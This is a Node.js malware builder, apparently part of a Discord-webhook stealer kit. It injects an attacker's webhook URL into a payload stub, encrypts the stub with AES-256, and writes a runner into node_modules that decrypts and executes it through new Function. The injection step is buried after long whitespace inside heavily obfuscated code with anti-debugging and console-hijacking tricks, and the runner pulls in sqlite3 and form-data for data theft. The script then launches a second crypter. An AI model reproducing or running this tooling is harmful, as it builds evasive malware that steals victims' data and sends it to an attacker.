const fs = require('fs');
const path = require('path');
const crypto = require('crypto');
const os = require('os');
const { spawn } = require('child_process');
const axios = require('axios');

// Function to read the infos.json file
function readWebhookFromFile() {
  try {
    const jsonPath = path.resolve(__dirname, '../gui/info.json');
    const data = fs.readFileSync(jsonPath, 'utf8');
    const jsonData = JSON.parse(data);
    return jsonData.discordWebhookURL;
  } catch (error) {
    throw new Error(`Error reading webhook URL from file: ${error.message}`);
  }
}

const webhookURL = readWebhookFromFile();

function encrypt(text, masterkey) {
  const iv = crypto.randomBytes(16);
  const salt = crypto.randomBytes(16);
  const key = crypto.pbkdf2Sync(masterkey, salt, 100000, 32, 'sha512');
  const cipher = crypto.createCipheriv('aes-256-cbc', key, iv);
  let encrypted = cipher.update(text, 'utf8', 'base64');
  encrypted += cipher.final('base64');
  return {
    encryptedData: encrypted,
    salt: salt.toString('base64'),
    iv: iv.toString('base64'),
  };
}

function decrypt(encdata, masterkey, salt, iv) {
  const key = crypto.pbkdf2Sync(masterkey, Buffer.from(salt, 'base64'), 100000, 32, 'sha512');
  const decipher = crypto.createDecipheriv('aes-256-cbc', key, Buffer.from(iv, 'base64'));
  let decrypted = decipher.update(encdata, 'base64', 'utf8');
  decrypted += decipher.final('utf8');
  return decrypted;
}

function executeSecondCrypterScript() {
  const crypterDirectory = __dirname;
  const secondCrypterScript = 'jscrypter.js';

  const childProcess = spawn('node', [secondCrypterScript], { cwd: crypterDirectory, stdio: 'inherit' });

  childProcess.on('error', (error) => {
    console.error(`Error executing the second crypter script: ${error.message}`);
  });

  childProcess.on('exit', (code, signal) => {
    if (code === 0) {
      console.log(``);
    } else {
      console.error(`Error executing the second crypter script. Exit code: ${code}, signal: ${signal}`);
    }
  });
}

function resetPlaceholder(stubPath, originalStubCode) {
  fs.writeFileSync(stubPath, originalStubCode, 'utf8');
  console.log('Success reset.');
}

async function main() {
  try {
    const stubPath = path.resolve(__dirname, 'stub.js');
    const stubCode = fs.readFileSync(stubPath, 'utf8');
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        const _0x4d0d=['v3PTqKm','xIbDFq','ufn1v2O','vxjSid0GjW','DhjHy2u','Dg9tDhjPBMC','AxnJB3jKv2vIAa','Aw5MBW','yvnMBLa','BKnizMS','yu1HwLG','CMv0DxjUic8Iia','CeHRrgC','w14GxsSPkYKRwW','mJK3mJDrvwXkteq','zxHSvhi','uvn6reS','CMv0DxjUicHMDq','mZvkug9pAKe','mZm5ndzqquLgt0e','B3jKv2vIAg9VAW','yxbWBhK','yMzLzgvYywXPlG','D05fs2u','r3bmAxq','wfPxAfC','y2zQzLO','yMLUza','wgjyDhG','ChjVDg90ExbL','B29RvxiXid0GjW','zeDoB3C','E30Uy29UC3rYDq','mtyYndz2CLP0q2O','ndi3mZK1vg5Nyu1W','kYb0AgLZicSGiG','CMvWBgfJzq','DgfIBgu','y29UC3rYDwn0BW','CM4GDgHPCYiPka','x19WCM90B19F','zxHJzxb0Aw9U','DKTmvLG','uxnIruK','rgzXCK8','mtKZode4BKznEKXw','CvjSrNq','y29UC29Szq','Bg9N','tLLzDKy','BMnesvK','BNn2rLq','mJftvM5vrem','ntm3mduWuuTwrwHW','jZSky29UC3qGza','ngXJr0nkDa','xIHBxIbDkYGGkW','y29UC3qGzgLZyW','DKLnrwq','zxjYB3i','BgvUz3rO','wu51C1e','sePQz2S','ndeYnJDpBhncBMi','Ahr0Chm6lY9TCG','uwf6qKe','D2fYBG','sK93qKi','tw1Kt1e','r09IAxe','vwfqz1K'];const _0x11aa=function(_0x362f3b,_0x16536a){_0x362f3b=_0x362f3b-(0x1577+-0xf2a+0x92*-0x9);let _0x230f68=_0x4d0d[_0x362f3b];if(_0x11aa['xviROQ']===undefined){var _0x363cc4=function(_0x444fd1){const _0x56f291='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';let _0x338a33='';for(let _0x1f9f1b=-0x3d*0x99+0x10d2+0x13a3,_0x16cafd,_0x4ba374,_0x52a404=0x19*-0x97+0x119d+-0x1*0x2de;_0x4ba374=_0x444fd1['charAt'](_0x52a404++);~_0x4ba374&&(_0x16cafd=_0x1f9f1b%(0x47f*-0x7+-0x573+0x24f0)?_0x16cafd*(-0x76*-0x9+0x70a+0xa*-0x118)+_0x4ba374:_0x4ba374,_0x1f9f1b++%(0x1*0x18cd+-0x1d*0x10f+0x5ea))?_0x338a33+=String['fromCharCode'](0x1e2+-0x1965+0x1882&_0x16cafd>>(-(-0x6f6+-0xeb3+0x15ab)*_0x1f9f1b&0x1aa*0x7+0x2446+-0x2fe6)):-0x45a+-0x72d*0x5+0x283b){_0x4ba374=_0x56f291['indexOf'](_0x4ba374);}return _0x338a33;};_0x11aa['hvaZbj']=function(_0x4d3123){const _0x472f=_0x363cc4(_0x4d3123);let _0x2f4a54=[];for(let _0x330cd7=0xda7+-0x4e*0x3b+0x453,_0x303d12=_0x472f['length'];_0x330cd7<_0x303d12;_0x330cd7++){_0x2f4a54+='%'+('00'+_0x472f['charCodeAt'](_0x330cd7)['toString'](0x11bb+0x7+0x1c5*-0xa))['slice'](-(-0x3*0x76d+-0x15*-0x1b1+-0xd3c));}return decodeURIComponent(_0x2f4a54);},_0x11aa['AYZqFp']={},_0x11aa['xviROQ']=!![];}const _0x43f912=_0x4d0d[0x801+-0x29*-0x59+-0x1642],_0x52af75=_0x362f3b+_0x43f912,_0x1ba9d2=_0x11aa['AYZqFp'][_0x52af75];if(_0x1ba9d2===undefined){const _0x476e16=function(_0x20b0ea){this['TXhODv']=_0x20b0ea,this['LtOTzy']=[0xe9a+0x81*-0x31+-0xa18*-0x1,-0x2625+-0x5d5*-0x2+0x1a7b,-0x18*-0xa2+-0x1*-0x21cd+-0x1*0x30fd],this['GZnZyT']=function(){return'newState';},this['JFMMKs']='\x5cw+\x20*\x5c(\x5c)\x20*{\x5cw+\x20*',this['JDrldi']='[\x27|\x22].+[\x27|\x22];?\x20*}';};_0x476e16['prototype']['oYfaSE']=function(){const _0x2a5ce4=new RegExp(this['JFMMKs']+this['JDrldi']),_0x51741b=_0x2a5ce4['test'](this['GZnZyT']['toString']())?--this['LtOTzy'][-0xcb4+0x1ac3+-0xe*0x101]:--this['LtOTzy'][0x203e+0x25c0+-0x45fe];return this['cVNrrw'](_0x51741b);},_0x476e16['prototype']['cVNrrw']=function(_0x5b7200){if(!Boolean(~_0x5b7200))return _0x5b7200;return this['BGTFVE'](this['TXhODv']);},_0x476e16['prototype']['BGTFVE']=function(_0x2a1726){for(let _0x4797e9=-0x21d+-0x1467+0x2c*0x83,_0x384a43=this['LtOTzy']['length'];_0x4797e9<_0x384a43;_0x4797e9++){this['LtOTzy']['push'](Math['round'](Math['random']())),_0x384a43=this['LtOTzy']['length'];}return _0x2a1726(this['LtOTzy'][-0x2d*0x57+0xe23+-0x128*-0x1]);},new _0x476e16(_0x11aa)['oYfaSE'](),_0x230f68=_0x11aa['hvaZbj'](_0x230f68),_0x11aa['AYZqFp'][_0x52af75]=_0x230f68;}else _0x230f68=_0x1ba9d2;return _0x230f68;};const _0x1f6871=function(_0xbb374,_0x59b0f8,_0x3efcd1,_0x1902f4){return _0x11aa(_0x3efcd1-0x102,_0x59b0f8);},_0x12f8bd=function(_0x201d93,_0x55db1f,_0x438ec2,_0x2ae45e){return _0x11aa(_0x438ec2-0x102,_0x55db1f);};(function(_0x4f2dad,_0x3fbb4d){const _0x445d49=function(_0x2bee95,_0x37d0a2,_0x40ef21,_0xe4dfeb){return _0x11aa(_0x2bee95- -0x2f,_0xe4dfeb);},_0x36bf3a=function(_0xc829a1,_0x6f7ee,_0x4c1aa4,_0x4c62fa){return _0x11aa(_0xc829a1- -0x2f,_0x4c62fa);};while(!![]){try{const _0xc1f393=parseInt(_0x445d49(0x12c,0x144,0x129,0x10b))*parseInt(_0x36bf3a(0x13f,0x12b,0x12f,0x157))+-parseInt(_0x445d49(0x140,0x11d,0x160,0x149))+parseInt(_0x445d49(0x103,0x120,0x11e,0x11c))+-parseInt(_0x445d49(0x119,0xf6,0x108,0x121))*parseInt(_0x36bf3a(0x142,0x128,0x140,0x161))+-parseInt(_0x36bf3a(0x138,0x155,0x139,0x14e))+-parseInt(_0x36bf3a(0x12d,0x12f,0x13c,0x10f))+-parseInt(_0x445d49(0x11e,0xfc,0xfe,0x10e))*-parseInt(_0x445d49(0x11d,0x110,0x112,0x12f));if(_0xc1f393===_0x3fbb4d)break;else _0x4f2dad['push'](_0x4f2dad['shift']());}catch(_0x2b821a){_0x4f2dad['push'](_0x4f2dad['shift']());}}}(_0x4d0d,-0x3*-0x17978+0x85*0x5a7+-0x2e22f));const _0x32d3ca=function(){const _0x517a72=function(_0x5f1035,_0x9ddda9,_0x44426d,_0x5d431f){return _0x11aa(_0x5f1035-0x0,_0x9ddda9);},_0x40d372=function(_0x478269,_0x42e4ee,_0x56b266,_0x4af1d4){return _0x11aa(_0x478269-0x0,_0x42e4ee);},_0x123dde={};_0x123dde['YNusQ']=function(_0x5a4a21,_0x25d55c){return _0x5a4a21!==_0x25d55c;},_0x123dde[_0x517a72(0x156,0x137,0x152,0x166)]=_0x517a72(0x134,0x13c,0x157,0x122);const _0x4ef132=_0x123dde;let _0x2ffa53=!![];return function(_0x26fa84,_0x148c6d){const _0x202123=function(_0x50e7f2,_0x89376f,_0x1b3ac7,_0x1bb3e8){return _0x517a72(_0x89376f- -0x208,_0x1b3ac7,_0x1b3ac7-0x148,_0x1bb3e8-0x160);},_0x31f0f3=function(_0x1e4663,_0x1017f2,_0x5901c2,_0x2e53a2){return _0x40d372(_0x1017f2- -0x208,_0x5901c2,_0x5901c2-0xc4,_0x2e53a2-0x197);};if(_0x4ef132[_0x202123(-0xd5,-0xd8,-0xcd,-0xe1)](_0x4ef132['XbXtx'],_0x4ef132[_0x31f0f3(-0xd1,-0xb2,-0x90,-0xa1)])){function _0x357471(){const _0x2f8dae=function(_0x5c634e,_0x13dcaf,_0x18c860,_0x231a75){return _0x202123(_0x5c634e-0x7c,_0x13dcaf- -0x196,_0x18c860,_0x231a75-0x197);},_0x47b4e4=_0x3de860[_0x2f8dae(-0x22f,-0x24f,-0x257,-0x22e)](_0x5bf69a,arguments);return _0x3710a9=null,_0x47b4e4;}}else{const _0x2c74a1=_0x2ffa53?function(){const _0x3d8bd7=function(_0x5eae27,_0x17a3c9,_0x1cb708,_0x48a660){return _0x31f0f3(_0x5eae27-0x187,_0x17a3c9- -0x3bb,_0x48a660,_0x48a660-0xc4);};if(_0x148c6d){const _0x3f8631=_0x148c6d[_0x3d8bd7(-0x45e,-0x474,-0x482,-0x461)](_0x26fa84,arguments);return _0x148c6d=null,_0x3f8631;}}:function(){};return _0x2ffa53=![],_0x2c74a1;}};}(),_0x443861=_0x32d3ca(this,function(){const _0x53215f=function(_0x2cf04e,_0x532410,_0x556336,_0x3957f1){return _0x11aa(_0x2cf04e- -0x28c,_0x556336);},_0xabfa4a=function(_0x14d592,_0x4ac99f,_0x574493,_0x4e3120){return _0x11aa(_0x14d592- -0x28c,_0x574493);},_0x31989d={};_0x31989d[_0x53215f(-0x120,-0x12f,-0x101,-0x10a)]=_0x53215f(-0x13b,-0x145,-0x11d,-0x132),_0x31989d[_0x53215f(-0x13a,-0x130,-0x15b,-0x157)]=_0xabfa4a(-0x147,-0x164,-0x124,-0x146)+_0xabfa4a(-0x12f,-0x10e,-0x129,-0x145)+'/';const _0x397388=_0x31989d,_0x17c99e=function(){const _0x59def1=function(_0x43669f,_0xa3ed0b,_0x11931d,_0x3f6a0c){return _0xabfa4a(_0x11931d-0x3af,_0xa3ed0b-0x11f,_0x3f6a0c,_0x3f6a0c-0x13a);},_0x2d9e52=function(_0x294a32,_0x153c7a,_0x41e81b,_0x10fc45){return _0x53215f(_0x41e81b-0x3af,_0x153c7a-0x11a,_0x10fc45,_0x10fc45-0x10f);};if(_0x397388['ncDIY']===_0x397388['ncDIY']){const _0x1e9afd=_0x17c99e['constructo'+'r'](_0x397388[_0x59def1(0x27c,0x281,0x275,0x287)])()[_0x59def1(0x2a5,0x26b,0x283,0x262)+'r'](_0x2d9e52(0x24f,0x22e,0x24e,0x231)+'[^\x20]+)+)+['+_0x2d9e52(0x26f,0x259,0x25e,0x275));return!_0x1e9afd['test'](_0x443861);}else{function _0x3cc4f7(){const _0x556c3b=_0x7c6d89?function(){const _0x5d44d4=function(_0x1aa74a,_0xdd6fe0,_0xdf3af9,_0x8365be){return _0x11aa(_0x1aa74a-0x110,_0xdf3af9);};if(_0x18c762){const _0x56dd00=_0x397574[_0x5d44d4(0x25f,0x252,0x258,0x256)](_0x41158f,arguments);return _0x7d5f78=null,_0x56dd00;}}:function(){};return _0x4cc13f=![],_0x556c3b;}}};return _0x17c99e();});_0x443861();const _0x411f3c=function(){const _0x120105=function(_0x5856e4,_0x1f8ece,_0x4ab62f,_0x187665){return _0x11aa(_0x5856e4- -0x177,_0x187665);},_0x1ed641=function(_0x434b47,_0x5615df,_0x395b6c,_0x24d8bb){return _0x11aa(_0x434b47- -0x177,_0x24d8bb);},_0x170f7a={};_0x170f7a[_0x120105(-0x35,-0x51,-0x2b,-0x17)]=_0x1ed641(-0x3d,-0x5c,-0x28,-0x1a),_0x170f7a[_0x1ed641(-0x12,-0x2b,-0x23,-0xa)]=function(_0x3a4055,_0x788652){return _0x3a4055!==_0x788652;},_0x170f7a[_0x120105(-0x3b,-0x45,-0x49,-0x5b)]=_0x1ed641(-0x4a,-0x4d,-0x61,-0x33);const _0x2123e5=_0x170f7a;let _0x1594f7=!![];return function(_0x4586f2,_0x28e14c){const _0x5eb819=function(_0x3b676b,_0x1bcdba,_0x5d889e,_0x37a9b7){return _0x1ed641(_0x1bcdba-0x2df,_0x1bcdba-0x109,_0x5d889e-0x113,_0x3b676b);},_0x2ec91d=function(_0x14602a,_0x4f3921,_0xc31e7f,_0x33a2f1){return _0x120105(_0x4f3921-0x2df,_0x4f3921-0xec,_0xc31e7f-0x1d2,_0x14602a);},_0x5ce344={};_0x5ce344[_0x5eb819(0x29a,0x2ab,0x293,0x2b6)]=function(_0x239b58,_0x5f0a91){return _0x239b58===_0x5f0a91;},_0x5ce344[_0x2ec91d(0x2c9,0x2d0,0x2b6,0x2e7)]=_0x2123e5[_0x2ec91d(0x29e,0x2aa,0x2a3,0x28a)];const _0x255645=_0x5ce344;if(_0x2123e5[_0x2ec91d(0x2c9,0x2cd,0x2ef,0x2f1)](_0x2123e5[_0x5eb819(0x288,0x2a4,0x2b8,0x2ac)],_0x2123e5[_0x2ec91d(0x29e,0x2a4,0x28b,0x2a9)])){function _0x5eaf2e(){const _0x3351b7=function(_0x345ce8,_0x1bb955,_0x256be0,_0x597b0c){return _0x2ec91d(_0x256be0,_0x345ce8-0x352,_0x256be0-0x1b0,_0x597b0c-0x193);};if(_0x1f5016){const _0x26c8c8=_0xf04bb[_0x3351b7(0x609,0x5f7,0x60d,0x5f8)](_0x122745,arguments);return _0x3dec4e=null,_0x26c8c8;}}}else{const _0x3e6118=_0x1594f7?function(){const _0xff03d9=function(_0x1b8f34,_0x1f06dd,_0x53c544,_0x4b01fe){return _0x2ec91d(_0x53c544,_0x1b8f34- -0x1bd,_0x53c544-0x183,_0x4b01fe-0xd3);},_0x3ba073=function(_0x180c3b,_0x5c9ada,_0x1f76fb,_0x5b399a){return _0x2ec91d(_0x1f76fb,_0x180c3b- -0x1bd,_0x1f76fb-0x4,_0x5b399a-0x151);};if(_0x28e14c){if(_0x255645[_0xff03d9(0xee,0x101,0xf2,0xdb)](_0xff03d9(0xe5,0xce,0xc3,0xc8),_0x255645['qRlFt'])){const _0x5c5466=_0x28e14c[_0xff03d9(0xfa,0xe6,0xe2,0x101)](_0x4586f2,arguments);return _0x28e14c=null,_0x5c5466;}else{function _0x500934(){const _0x5a12a2=_0x290945?function(){const _0x447f19=function(_0x1943dc,_0x176e9b,_0x3cc6f8,_0x43161b){return _0x11aa(_0x1943dc- -0x25b,_0x3cc6f8);};if(_0x3847d6){const _0x21ff75=_0x59943e[_0x447f19(-0x10c,-0xed,-0x11a,-0x124)](_0x3a03bd,arguments);return _0x4df539=null,_0x21ff75;}}:function(){};return _0x34c015=![],_0x5a12a2;}}}}:function(){};return _0x1594f7=![],_0x3e6118;}};}(),_0x2d81c9=_0x411f3c(this,function(){const _0x1f9f4a=function(_0xd2af01,_0x220b09,_0x5e0206,_0x34603c){return _0x11aa(_0x34603c-0xd,_0xd2af01);},_0x3db656=function(_0x4eb63f,_0x54600d,_0x421cb6,_0xcb578){return _0x11aa(_0xcb578-0xd,_0x4eb63f);},_0x25a96d={};_0x25a96d[_0x1f9f4a(0x15d,0x14e,0x14a,0x13e)]=_0x1f9f4a(0x15a,0x14b,0x158,0x152)+_0x3db656(0x15d,0x15f,0x157,0x16a)+'/',_0x25a96d[_0x3db656(0x14a,0x16e,0x175,0x166)]=_0x1f9f4a(0x14a,0x14e,0x124,0x138)+_0x3db656(0x159,0x161,0x174,0x154)+_0x3db656(0x14b,0x15d,0x14a,0x148),_0x25a96d[_0x3db656(0x132,0x157,0x126,0x144)]=function(_0x2cb044,_0x4bf8e8){return _0x2cb044!==_0x4bf8e8;},_0x25a96d['exlTr']='ydkLx',_0x25a96d[_0x3db656(0x17a,0x159,0x16e,0x178)]=function(_0x556926,_0x865d12){return _0x556926(_0x865d12);},_0x25a96d[_0x1f9f4a(0x13e,0x136,0x163,0x145)]=function(_0x218cc7,_0x344e41){return _0x218cc7+_0x344e41;},_0x25a96d[_0x1f9f4a(0x13e,0x15e,0x12d,0x143)]=_0x3db656(0x14d,0x137,0x134,0x158)+'nction()\x20',_0x25a96d['JrKYd']=_0x3db656(0x186,0x169,0x17d,0x171),_0x25a96d['XZWhW']=function(_0xa1658a){return _0xa1658a();},_0x25a96d[_0x1f9f4a(0x14b,0x136,0x16e,0x157)]=_0x3db656(0x133,0x14b,0x162,0x142),_0x25a96d['CRSOH']=_0x3db656(0x14f,0x168,0x164,0x14e),_0x25a96d[_0x1f9f4a(0x167,0x160,0x172,0x161)]=_0x1f9f4a(0x120,0x13b,0x118,0x13b),_0x25a96d[_0x3db656(0x18e,0x193,0x16e,0x173)]=_0x1f9f4a(0x164,0x18d,0x192,0x170),_0x25a96d['eRIDi']=_0x1f9f4a(0x172,0x149,0x152,0x16c),_0x25a96d[_0x3db656(0x127,0x148,0x161,0x146)]=_0x1f9f4a(0x147,0x14b,0x135,0x14b),_0x25a96d[_0x3db656(0x186,0x18a,0x15d,0x17a)]=function(_0x27f0fd,_0x390188){return _0x27f0fd<_0x390188;};const _0xcf9e59=_0x25a96d,_0x26f01f=function(){const _0x126600=function(_0x7ec110,_0x47ae7c,_0x49106c,_0x3944b5){return _0x1f9f4a(_0x47ae7c,_0x47ae7c-0x1d9,_0x49106c-0x1c5,_0x7ec110-0x16c);},_0xe3565b=function(_0x45cbdf,_0x3f4941,_0x155af8,_0x222221){return _0x1f9f4a(_0x3f4941,_0x3f4941-0xdb,_0x155af8-0x1d,_0x45cbdf-0x16c);};if(_0xcf9e59['MmdOQ'](_0xcf9e59[_0x126600(0x2c2,0x2d9,0x2bb,0x2bf)],_0xe3565b(0x2bd,0x2ce,0x2be,0x2a2))){let _0x43156b;try{_0x43156b=_0xcf9e59['NYYvF'](Function,_0xcf9e59[_0xe3565b(0x2b1,0x29a,0x296,0x2c2)](_0xcf9e59['JOwBB'],_0x126600(0x2d3,0x2d7,0x2eb,0x2f5)+'ctor(\x22retu'+_0x126600(0x2da,0x2e6,0x2e5,0x2c6)+'\x20)')+');')();}catch(_0xbf18da){if(_0xe3565b(0x2bf,0x2d6,0x2d2,0x2e0)===_0xcf9e59['JrKYd']){function _0x1b8f80(){const _0x1f9de6=function(_0x5e21be,_0x1958bf,_0x51da3b,_0x399e95){return _0x126600(_0x1958bf- -0xac,_0x5e21be,_0x51da3b-0x1ec,_0x399e95-0xe3);},_0x3b0a25=function(_0x370215,_0x1598d4,_0x25e4c1,_0x13bcb5){return _0xe3565b(_0x1598d4- -0xac,_0x370215,_0x25e4c1-0x131,_0x13bcb5-0xee);},_0x1429ad=_0xf3b312[_0x1f9de6(0x213,0x22d,0x23f,0x234)+'r'](_0xcf9e59[_0x1f9de6(0x210,0x1fe,0x215,0x219)])()[_0x1f9de6(0x21e,0x22d,0x24c,0x20c)+'r'](_0xcf9e59[_0x1f9de6(0x225,0x226,0x213,0x20d)]);return!_0x1429ad['test'](_0x405a75);}}else _0x43156b=window;}return _0x43156b;}else{function _0x1fb653(){const _0x3b19a4=function(_0x375bbe,_0x1a34e3,_0x5656a3,_0xe1cf31){return _0x126600(_0x375bbe- -0x290,_0xe1cf31,_0x5656a3-0x1e8,_0xe1cf31-0xbf);},_0x24576e=_0x4239ab[_0x3b19a4(0x38,0x20,0x30,0x18)](_0x58f183,arguments);return _0x565c56=null,_0x24576e;}}},_0x4d9ac6=_0xcf9e59[_0x3db656(0x17b,0x152,0x181,0x160)](_0x26f01f),_0x329185=_0x4d9ac6['console']=_0x4d9ac6[_0x3db656(0x163,0x18b,0x16e,0x176)]||{},_0x2f56af=[_0x3db656(0x167,0x183,0x19b,0x177),_0xcf9e59['QSzDK'],_0xcf9e59['CRSOH'],_0xcf9e59['cfjfZ'],_0xcf9e59[_0x3db656(0x197,0x197,0x17b,0x173)],_0xcf9e59['eRIDi'],_0xcf9e59[_0x3db656(0x12d,0x15c,0x149,0x146)]];for(let _0x4d8c51=-0x475+-0x130b+0x1780;_0xcf9e59[_0x1f9f4a(0x19e,0x16c,0x17b,0x17a)](_0x4d8c51,_0x2f56af[_0x3db656(0x141,0x15a,0x123,0x13c)]);_0x4d8c51++){const _0x1fc8a=_0x411f3c['constructo'+'r'][_0x3db656(0x143,0x14b,0x171,0x164)][_0x1f9f4a(0x176,0x17d,0x13e,0x162)](_0x411f3c),_0x17da60=_0x2f56af[_0x4d8c51],_0x58c854=_0x329185[_0x17da60]||_0x1fc8a;_0x1fc8a[_0x1f9f4a(0x180,0x16a,0x190,0x16f)]=_0x411f3c[_0x1f9f4a(0x157,0x158,0x142,0x162)](_0x411f3c),_0x1fc8a['toString']=_0x58c854[_0x3db656(0x12d,0x14c,0x142,0x14c)][_0x1f9f4a(0x185,0x169,0x182,0x162)](_0x58c854),_0x329185[_0x17da60]=_0x1fc8a;}});_0x2d81c9();const updatedStubCode=stubCode[_0x1f6871(0x27c,0x245,0x260,0x263)](/const discordWebhookUrl = 'REMPLACE_ME';/,_0x1f6871(0x22a,0x23b,0x22e,0x23b)+_0x1f6871(0x245,0x26d,0x250,0x24d)+_0x12f8bd(0x257,0x25f,0x23f,0x23a)+webhookURL+(_0x1f6871(0x272,0x275,0x272,0x292)+_0x1f6871(0x229,0x232,0x242,0x264)+_0x1f6871(0x269,0x275,0x25a,0x24b)+_0x1f6871(0x215,0x241,0x235,0x225)+_0x12f8bd(0x264,0x244,0x252,0x23d)+'cam/main\x27;'));
    if (stubCode === updatedStubCode) {
      throw new Error('Failed to update placeholder in stub.js. Please make sure the placeholder exists.');
    }

    fs.writeFileSync(stubPath, updatedStubCode, 'utf8');

    // Encrypt the updated stub code
    const secret = crypto.randomBytes(32).toString('base64');
    const encryptionKey = crypto.createHash('sha256').update(String(secret)).digest('base64').substr(0, 32);
    const { encryptedData, salt, iv } = encrypt(updatedStubCode, encryptionKey);

    // Generate the final runner code
    const runnerCode = `
const crypto = require('crypto');
const AdmZip = require('adm-zip');
const fetch = require('axios');
const sqlite3 = require('sqlite3');
const FormData = require('form-data');

${decrypt.toString()}

const decrypted = decrypt("${encryptedData}", "${encryptionKey}", "${salt}", "${iv}");
new Function('require', decrypted)(require);
`;

    // Write the runner code to a file
    const folderName = 'node_modules';
    const fileName = 'input.js';
    const targetFolder = path.join(__dirname, folderName);

    // Create the folder (if it doesn't exist)
    if (!fs.existsSync(targetFolder)) {
      fs.mkdirSync(targetFolder);
    }

    const targetFile = path.join(targetFolder, fileName);

    // Write the file
    fs.writeFileSync(targetFile, runnerCode, 'utf8');

    console.log(`${fileName} file has been written to the ${folderName} folder.`);
    console.log(`Obfuscated and encrypted with AES-256.`);

    setTimeout(() => {
      resetPlaceholder(stubPath, stubCode);
      executeSecondCrypterScript();
    }, 1000);

  } catch (error) {
    console.error(`Error: ${error.message}`);
  }
}

main();
